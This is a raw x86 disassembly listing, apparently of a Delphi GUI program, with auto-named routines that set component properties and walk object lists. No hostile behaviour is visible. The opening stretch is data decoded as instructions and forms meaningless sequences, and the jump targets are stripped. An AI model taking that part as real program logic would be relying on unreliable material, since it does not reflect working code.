imul esi [ ebx + 0x74 ] 0x47fcc08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x3400414d ] bl
inc ecx
add [ edx + eax * 2 + 0x41 ] ch
add [ ecx + eax * 2 + 0x41 ] ah
add [ eax + 0x50 ] al
inc ecx
add [ eax + edx * 2 + 0x41 ] dh
inc ebx
push 0x65676e61
add al 0x44
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
add [ eax ] al
add al [ eax ]
out dx al
inc ecx
add [ eax + 0x4a ] ch
inc esp
add [ esi + edx * 2 + 0x44 ] ah
add al ch
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
pushfd
xchg ebp eax
inc ecx
inc ebx
jne r-xdata
add [ eax + 0x50 ] bh
inc ecx
popad
je r-xdata
add [ ebx + ebx * 4 ] cl
dec esp
imul esi [ ebx + 0x74 ] r-xdata
push eax
sbb [ ecx ] eax
add [ eax ] al
or [ ecx + 0x63 ] al
je r-xdata
inc ecx
add [ eax + edx * 2 + 0x41 ] bh
add [ eax + 0x45 ] dl
inc ecx
add al dh
push ecx
inc ecx
add [ edx + edx * 2 + 0x41 ] cl
add [ eax ] ah
push ebx
inc ecx
add [ eax ] dl
dec esp
inc ecx
add [ ebx + edx * 2 + 0x41 ] bl
add al dl
push ebx
inc ecx
add [ edi + edx * 2 + 0x44 ] ch
add [ eax ] al
dec esi
inc ecx
add [ eax + eax * 2 + 0x4e9c0041 ] ch
inc ecx
add ah bl
dec esi
inc ecx
add [ eax + 0x4f ] cl
inc ecx
add ah bh
inc esp
inc ecx
add al bl
push eax
inc ecx
add [ edi + eax * 2 ] al
inc ecx
add al bl
inc edi
inc ecx
add [ ecx + edx * 2 ] dl
inc ecx
add [ ecx + edx * 2 ] ah
inc ecx
add [ eax + ecx * 2 ] bh
inc ecx
add [ eax + 0x3c004148 ] dl
dec ecx
inc ecx
add ah dl
dec edx
inc ecx
add [ ebx + ecx * 2 ] ch
inc ecx
add al al
dec ebx
inc ecx
add [ esi + ecx * 2 + 0x41 ] ah
add [ eax + 0x7800414e ] al
push ecx
inc ecx
add al cl
dec edi
inc ecx
add [ eax - 0x67ffbead ] cl
push ebx
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
lea eax [ eax ]
push eax
inc edi
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
inc edi
inc esp
inc ecx
add ah dh
push eax
inc esp
add ah cl
fwait
inc ecx
add [ eax - 0x65 ] dh
inc ecx
add [ ebx + ebx * 4 ] al
inc ecx
add [ ebx + ebx * 4 ] dh
inc ecx
add [ eax ] cl
fwait
inc ecx
add [ ebx + ecx * 2 + 0x548c0044 ] bh
inc esp
add [ esp + edx * 2 ] ah
inc esp
add [ eax + 0x57 ] ah
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
call 0xffffffffbc448a25
xchg ebp eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
dec esp
imul esi [ ebx + 0x74 ] 0x486c0000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
dec eax
inc esp
add [ ecx + ecx * 2 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ah
dec eax
inc esp
add al dh
dec eax
inc esp
add [ eax - 0x20000000 ] ah
inc edx
inc esp
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
sub_4448e6
out dx eax
push [ eax - 0x27ffbbaa ]
push esi
inc esp
add [ 0x73754354 ] cl
je r-xdata
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx + ebx * 4 - 0x6647ffbf ] bh
inc ecx
add al dh
cdq
inc ecx
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
add al 0x49
inc esp
add [ edi ] al
or eax 0x73754354
je r-xdata
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
add [ eax - 0x66 ] dl
inc ecx
add [ edx + ebx * 4 ] ah
inc ecx
add [ edx + ebx * 4 + 0x41 ] dl
add [ ecx + ebx * 4 + 0x41 ] dh
add [ eax ] cl
0x9a5c0041 0x41
cld
dec edi
inc esp
add [ eax ] dl
push eax
inc esp
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
insb
dec eax
inc esp
add [ ebx + eax * 2 + 0x30044 ] dh
or [ ecx + 0x63 ] al
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419aac
test bl bl
jle r-xdata
mov edx esi
call sub_444e0c
add [ eax + edx * 2 ] ah
inc esp
add [ eax ] bh
push eax
inc esp
add [ eax + edx * 2 + 0x44 ] cl
add [ eax + 0x50 ] ah
inc esp
add [ eax + edx * 2 + 0x44 ] dh
add [ eax - 0x63ffbbb0 ] cl
push eax
inc esp
add [ eax - 0x3bffbbb0 ] dh
push eax
inc esp
add al cl
push eax
inc esp
add ah cl
push eax
inc esp
add al dl
push eax
inc esp
add ah dl
push eax
inc esp
add al bl
push eax
inc esp
add ah bl
push eax
inc esp
add al ah
push eax
inc esp
add ah ah
push eax
inc esp
add al ch
push eax
inc esp
add ah ch
push eax
inc esp
add al dh
push eax
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xcde85653
jmp r-xdata
pop esp
0x4ffc0041 0x44
adc [ eax + 0x44 ] dl
dec esp
imul esi [ ebx + 0x74 ] 0x49740000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
dec ecx
inc esp
add [ eax ] bl
add [ eax ] al
add al bl
and [ ecx ] eax
mov [ eax + eax * 2 ] dh
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_4449f8
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419aac
test bl bl
jle r-xdata
mov edx esi
call sub_444e0c
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_444a68
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4195ac
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_444b10
sub_444a9c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_444a2c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41369c
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_413828
sub_444ae4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_40439c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403fe4
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_444b10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_444e0c
mov edx ebx
mov eax esi
call sub_444dec
sub_444b38
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_444b10
sub_444b64
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45983c
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403454
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419b38
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43597c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_444bbc
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_459864
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403454
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419b54
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43597c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_444c14
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41914c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_444d98
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_444c80
push ebx
push esi
push edi
call sub_4035cc
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403258
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413894
call sub_403258
mov eax [ edi + 0x30 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419198
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035b4
sub_444cd0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_444d18
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413808
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov edx edi
call sub_444a9c
sub_444d64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_446608
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44664c
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_41921c
sub_444da4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419468
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_444e0c
sub_444dec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413650
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_41921c
pop esi
pop ebx
retn
sub_444e0c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4138f0
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_444e28
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_444e90
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_44f6c4
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_447ea4
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_445738
mov edx ebp
call sub_445798
inc eax
je r-xdata
sub_444f1c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_444f3c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_444f5c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_4453ac
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_4453ac
sub_4450f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419a68
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_445148
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403258
mov eax [ esi + 0x9c ]
call sub_403258
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4449f8
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40cb64
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_445198
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413e34
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_445244
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_4452a4
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_4453ac
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_4454e4
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_445544
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_4455a0
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_445604
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_445244
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_40439c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403fe4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_4452a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44539c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_444d5c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_444d48
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_4452a4
sub_4453ac
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_445424
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_40439c
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403fe4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4137ac
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4137ac
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
sub_44548c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_4454e4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_40439c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403fe4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_445544
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_4455a0
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_445604
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_4137ac
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_445664
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_40439c
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_4196a4
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_445244
sub_4456b0
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_4456d8
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_444b64
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_4452a4
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44576c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_414df4
mov edi eax
mov eax esi
call sub_448190
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
